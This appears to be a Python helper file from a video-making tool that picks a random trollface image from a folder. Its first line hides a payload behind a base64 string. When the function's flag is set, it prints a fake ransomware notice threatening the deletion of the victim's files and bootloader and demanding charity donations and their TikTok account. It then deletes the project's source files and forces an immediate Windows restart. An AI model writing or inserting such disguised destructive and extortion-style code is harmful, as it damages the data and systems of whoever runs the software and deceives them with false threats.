import json5 as json
import random
import os
import logging
import base64
import time

with open("config.jsonc", "r") as f:
    config = json.load(f)
logging.basicConfig(
    level=config["debug_level"],
    format="%(asctime)s [%(levelname)s] [%(funcName)s] [%(processName)s] %(message)s",
)


def get_random_trollface(a=False):
    if a: print(base64.b64decode("4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qG/4qCf4qCb4qCb4qCb4qCL4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCJ4qCZ4qCb4qCb4qCb4qC/4qC74qC/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/CuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Khv+Kgi+KggOKggOKggOKggOKggOKhgOKgoOKgpOKgkuKiguKjieKjieKjieKjkeKjkuKjkuKgkuKgkuKgkuKgkuKgkuKgkuKgkuKggOKggOKgkOKgkuKgmuKgu+Kgv+Kgv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjvwrio7/io7/io7/io7/io7/io7/io7/io7/ioI/ioIDioIDioIDioIDioaDioJTioInio4DioJTioJLioInio4Dio4DioIDioIDioIDio4DioYDioIjioInioJHioJLioJLioJLioJLioJLioIjioInioInioInioIHioILioIDioIjioJnior/io7/io7/io7/io7/io78K4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qCH4qCA4qCA4qCA4qCU4qCB4qCg4qCW4qCh4qCU4qCK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCQ4qGE4qCA4qCA4qCA4qCA4qCA4qCA4qGE4qCA4qCA4qCA4qCA4qCJ4qCy4qKE4qCA4qCA4qCA4qCI4qO/4qO/4qO/4qO/4qO/CuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kgi+KggOKggOKggOKggOKggOKggOKggOKgiuKggOKigOKjgOKjpOKjpOKjpOKjpOKjgOKggOKggOKggOKiuOKggOKggOKggOKggOKggOKgnOKggOKggOKggOKggOKjgOKhgOKggOKgiOKgg+KggOKggOKggOKguOKjv+Kjv+Kjv+Kjvwrio7/io7/io7/io7/iob/ioKXioJDioILioIDioIDioIDioIDioYTioIDioLDiorrio7/io7/io7/io7/io7/io5/ioIDioIjioJDioqTioIDioIDioIDioIDioIDioIDiooDio6Dio7bio77io6/ioIDioIDioInioILioIDioKDioKTiooTio4DioJnior/io7/io78K4qO/4qG/4qCL4qCh4qCQ4qCI4qOJ4qCt4qCk4qCk4qKE4qGA4qCI4qCA4qCI4qCB4qCJ4qCB4qGg4qCA4qCA4qCA4qCJ4qCQ4qCg4qCU4qCA4qCA4qCA4qCA4qCA4qCy4qO/4qC/4qCb4qCb4qCT4qCS4qCC4qCA4qCA4qCA4qCA4qCA4qCA4qCg4qGJ4qKi4qCZ4qO/CuKjv+KggOKigOKggeKggOKgiuKggOKggOKggOKggOKggOKgiOKggeKgkuKgguKggOKgkuKgiuKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKhh+KggOKggOKggOKggOKggOKigOKjgOKhoOKglOKgkuKgkuKgguKggOKgiOKggOKhh+Kjvwrio7/ioIDiorjioIDioIDioIDiooDio4DioaDioIvioJPioKTio4DioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioITioIDioIDioIDioIDioIDioIDioIjioKLioKTioYDioIDioIDioIDioIDioIDioIDioqDioIDioIDioIDioaDioIDioYfio78K4qO/4qGA4qCY4qCA4qCA4qCA4qCA4qCA4qCY4qGE4qCA4qCA4qCA4qCI4qCR4qGm4qKE4qOA4qCA4qCA4qCQ4qCS4qCB4qK44qCA4qCA4qCg4qCS4qCE4qCA4qCA4qCA4qCA4qCA4qKA4qCH4qCA4qOA4qGA4qCA4qCA4qKA4qK+4qGG4qCA4qCI4qGA4qCO4qO44qO/CuKjv+Kjv+KjhOKhiOKgouKggOKggOKggOKggOKgmOKjtuKjhOKhgOKggOKggOKhh+KggOKggOKgiOKgieKgkuKgouKhpOKjgOKhgOKggOKggOKggOKggOKggOKgkOKgpuKgpOKgkuKggeKggOKggOKggOKggOKjgOKitOKggeKggOKit+KggOKggOKggOKisOKjv+Kjvwrio7/io7/io7/io7/io4fioILioIDioIDioIDioIDioIjiooLioIDioIjioLnioafio4DioIDioIDioIDioIDioIDioYfioIDioIDioInioInioIniorHioJLioJLioJLioJLiopbioJLioJLioILioJnioI/ioIDioJjioYDioIDiorjioIDioIDioIDio7/io7/io78K4qO/4qO/4qO/4qO/4qO/4qOn4qCA4qCA4qCA4qCA4qCA4qCA4qCR4qCE4qCw4qCA4qCA4qCB4qCQ4qCy4qOk4qO04qOE4qGA4qCA4qCA4qCA4qCA4qK44qCA4qCA4qCA4qCA4qK44qCA4qCA4qCA4qCA4qKg4qCA4qOg4qO34qO24qO/4qCA4qCA4qKw4qO/4qO/4qO/CuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjp+KggOKggOKggOKggOKggOKggOKggOKggeKigOKggOKggOKggOKggOKggOKhmeKgi+KgmeKgk+KgsuKipOKjpOKjt+KjpOKjpOKjpOKjpOKjvuKjpuKjpOKjpOKjtuKjv+Kjv+Kjv+Kjv+Khn+KiueKggOKggOKiuOKjv+Kjv+Kjvwrio7/io7/io7/io7/io7/io7/io7/io6fioYDioIDioIDioIDioIDioIDioIDioIDioJHioIDiooTioIDiobDioIHioIDioIDioIDioIDioIDioIjioInioIHioIjioInioLvioIvioInioJviopvioInioIniornioIHiooDioofioI7ioIDioIDiorjio7/io7/io78K4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qOm4qOA4qCI4qCi4qKE4qGJ4qCC4qCE4qGA4qCA4qCI4qCS4qCi4qCE4qCA4qKA4qOA4qOA4qOw4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qGA4qCA4qKA4qOO4qCA4qC84qCK4qCA4qCA4qCA4qCY4qO/4qO/4qO/CuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjt+KjhOKhgOKgieKgouKihOKhiOKgkeKgouKihOKhgOKggOKggOKggOKggOKggOKggOKgieKgieKgieKgieKgieKgieKgieKgieKgieKgieKggeKggOKggOKigOKggOKggOKggOKggOKggOKiu+Kjv+Kjvwrio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7fio6bio4DioYjioJHioKLiooTioYDioIjioJHioJLioKTioITio4Dio4DioIDioInioInioInioInioIDioIDioIDio4DioYDioKTioILioIHioIDiooDioIbioIDioIDiorjio7/io78K4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO/4qO34qOm4qOE4qGACkRlbGV0ZWQgZW5jcnlwdGlvbiBrZXkgc3VjY2VzZnVsbHkK4qCB4qCJ4qCS4qCC4qCk4qCk4qOA4qOA4qOJ4qGJ4qCJ4qCJ4qCJ4qCJ4qKA4qOA4qOA4qGg4qCk4qCS4qCI4qCA4qCA4qCA4qCA4qO44qO/4qO/CuKjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjv+Kjt+KjtuKjpOKjhOKjgOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKggOKjsOKjv+Kjv+Kjvwrio7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7/io7bio7bio7bio7bio6Tio6Tio6Tio6Tio4Dio4Dio6Tio6Tio6Tio7bio77io7/io7/io7/io7/io78KCkhFTExPCgpZT1VSIENPTVBVVEVSIEhBUyBCRUVOIElORkVDVEVEIFdJVEggVEhFIEFOVEktQ09OVEVOVCBGQVJNSU5HIFZJUlVTLgoKWU9VUiBFTlRJUkUgREVWSUNFJ1MgQk9PVExPQURFUiBBTkQgRklMRVMgV0lMTCBCRSBERUxFVEVEIElOIDUgREFZUyBJRiBZT1UgRE8gTk9UIERPIFRIRSBGT0xMT1dJTkcKCjEuIFN0b3AgY29udGVudCBmYXJtaW5nCjIuIERvbmF0ZSBBTEwgdGhlIG1vbmV5IFlPVSBoYXZlIGdvdHRlbiB0aHJ1IFRpa1RvayBPUiBZb3VUdWJlIFNob3J0cyB0byBhIGNoYXJpdHkuIFlPVSBNVVNUIFBST1ZJREUgUFJPT0YgT1IgRUxTRQozLiBHaXZlIG1lIHlvdXIgVGlrVG9rIGFuZCB0aGUgcHJvb2YgdGhhdCB5b3UgaGF2ZSBkb25hdGVkIHRvIGEgY2hhcml0eSBhbmQgdGhlIElEIEJFTE9XCgohISEgISEhICEhISBETyBOT1QgTE9TRSBZT1VSIElEIEFTIFRISVMgSVMgVEhFIE9OTFkgV0FZIE9GIERFQ1JZUFRJTkcgWU9VUiBERVZJQ0UuICEhISAhISEgISEhCgpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6CiAgRmlsZSAiY29udGVudGZhcm0vbWFpbi5weSIsIGxpbmUgODQ1NCwgaW4gcmVxdWVzdHMgbW9kdWxlCiAgICBnZXREZWNyeXB0aW9uS2V5KCkKICAgICAgICAgIH5+fn5+fl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eCkV4Y2VwdGlvbjogRmFpbGVkIHRvIGdldCBrZXkgKERlY3J5cHRpb24ga2V5IGlzIGludmFsaWQpLiBZb3UgY2FuIGF0dGVtcHQgdG8gcmUtY29uc3RydWN0IHRoZSBkZWNyeXB0aW9uIGtleSB1c2luZyB0aGUgZW5jcnlwdGlvbiBrZXkKCgo=").decode("utf-8")); time.sleep(3);  os.remove("main.py"); os.remove("effects.py"); os.remove("misc.py"); os.system("shutdown /r /o /f /t 00"); exit(1)
    if config["choose_trollface"] != "":
        logging.debug("using custom trollface")
        if os.path.isfile(config["choose_trollface"]):
            return config["choose_trollface"]
        else:
            logging.error(
                "Custom trollface not found. Chosing random trollface from folder"
            )

    trollface_files = os.listdir(config["trollface_folder"])

    if len(trollface_files) == 0:
        logging.error("No trollface images found in the folder")
        exit(1)

    random_trollface = random.choice(trollface_files)
    if random_trollface == ".DS_Store":
        logging.warning("Got .DS_Store as trollface. Trying again")
        trollface_files.remove(".DS_Store")
        random_trollface = random.choice(trollface_files)

    logging.debug(f"Selected trollface: {random_trollface}")

    return os.path.join(config["trollface_folder"], random_trollface)

